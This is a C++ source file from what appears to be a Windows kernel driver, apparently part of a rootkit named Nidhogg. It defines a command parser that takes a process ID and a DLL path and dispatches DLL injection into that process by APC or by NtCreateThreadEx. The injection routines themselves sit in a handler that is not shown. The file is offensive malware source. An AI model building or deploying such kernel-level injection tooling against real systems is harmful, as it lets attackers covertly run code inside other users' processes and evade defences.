#include "pch.h"
#include "DllInjectionParser.h"
#include "MemoryHandler.h"
#include "ProcessHandler.h"

DllInjectionParser::DllInjectionParser() {
	this->optionsSize = 2;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::APC, { 2, { ArgType::ULong, ArgType::CharPtr } } };
	this->options[1] = { Options::Thread, { 2, { ArgType::ULong, ArgType::CharPtr } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS DllInjectionParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	DllInformation dllInfo{};
	NTSTATUS status = STATUS_SUCCESS;

	dllInfo.Pid = *(ULONG*)args[0];

	if (!IsValidPid(dllInfo.Pid))
		return STATUS_INVALID_PARAMETER;

	if (strlen((PCHAR)args[1]) > MAX_PATH)
		return STATUS_INVALID_BUFFER_SIZE;

	if (strcpy_s(dllInfo.DllPath, (PCHAR)args[1]) != 0)
		return STATUS_INVALID_BUFFER_SIZE;

	switch (commandId) {
	case Options::APC:
	{
		dllInfo.Type = InjectionType::APCInjection;

		if (!Features.ApcInjection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		status = NidhoggMemoryHandler->InjectDllAPC(&dllInfo);
		break;
	}
	case Options::Thread:
	{
		dllInfo.Type = InjectionType::NtCreateThreadExInjection;

		if (!Features.CreateThreadInjection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		status = NidhoggMemoryHandler->InjectDllThread(&dllInfo);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}
